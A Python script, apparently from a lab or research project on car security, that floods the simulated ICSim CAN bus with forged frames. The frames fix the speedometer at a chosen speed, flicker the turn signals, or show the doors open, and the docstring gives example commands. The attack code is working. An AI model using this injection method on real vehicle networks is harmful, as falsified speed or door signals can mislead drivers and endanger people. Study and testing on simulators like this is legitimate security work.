#!/usr/bin/env python3
"""
Forjar quadros legítimos com valores manipulados. A injeção é feita em
alta frequência (default 1 ms), sobrescrevendo as mensagens legítimas
por simples superioridade de taxa.

IDs do ICSim (do zombieCraig/ICSim):
    0x244  -> Velocímetro (bytes [3:5] = velocidade em little-endian)
    0x188  -> Setas       (byte 2: bit 0 = direita, bit 1 = esquerda)
    0x19B  -> Portas      (byte 2: bits 0-3 = portas FL/FR/RL/RR)

    Testes:
    # Cravar velocímetro em 220 km/h por 30s
    python3 Spoofing-attack.py --iface vcan0 --target speed \\
            --value 220 --duration 30

    # Acender setas alternadas (efeito flicker)
    python3 Spoofing-attack.py --iface vcan0 --target signals \\
            --pattern flicker --duration 30

    # Abrir todas as portas
    python3 Spoofing-attack.py --iface vcan0 --target doors \\
            --value 0x0F --duration 30
"""

import argparse
import sys
from pathlib import Path

import can

sys.path.insert(0, str(Path(__file__).resolve().parent))
from lib.attack_runtime import open_socketcan, run_attack_loop, print_report
from lib.icsim_frames import (
    build_speed_frame, build_signal_frame, build_doors_frame,
)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Spoofing direcionado em ICSim")
    p.add_argument("--iface", default="vcan0")
    p.add_argument(
        "--target",
        choices=["speed", "signals", "doors"],
        required=True,
        help="ECU virtual a ser falsificada",
    )
    p.add_argument(
        "--value",
        type=lambda x: int(x, 0),
        default=0,
        help="Valor a injetar (km/h para speed, máscara para doors)",
    )
    p.add_argument(
        "--pattern",
        choices=["fixed", "flicker"],
        default="fixed",
        help="Padrão para setas: fixed ou flicker",
    )
    p.add_argument("--duration", type=float, default=30.0)
    p.add_argument(
        "--rate", type=float, default=1.0, help="Intervalo entre injeções em ms"
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()
    bus = open_socketcan(args.iface)

    print(
        f"[INFO] Spoofing alvo={args.target} | valor={args.value} | "
        f"duração={args.duration}s | intervalo={args.rate}ms"
    )

    # Closure mutável para alternar flicker entre chamadas.
    state = [False]

    def next_message() -> can.Message:
        if args.target == "speed":
            return build_speed_frame(args.value)
        if args.target == "doors":
            return build_doors_frame(args.value)
        # signals
        if args.pattern == "flicker":
            state[0] = not state[0]
            return build_signal_frame(state[0], not state[0])
        return build_signal_frame(
            bool(args.value & 0x02), bool(args.value & 0x01)
        )

    stats = run_attack_loop(
        args.duration, bus, next_message,
        rate_ms=args.rate, swallow_send_errors=True,
    )
    print_report("Spoofing", stats, label="Frames spoofados")


if __name__ == "__main__":
    main()
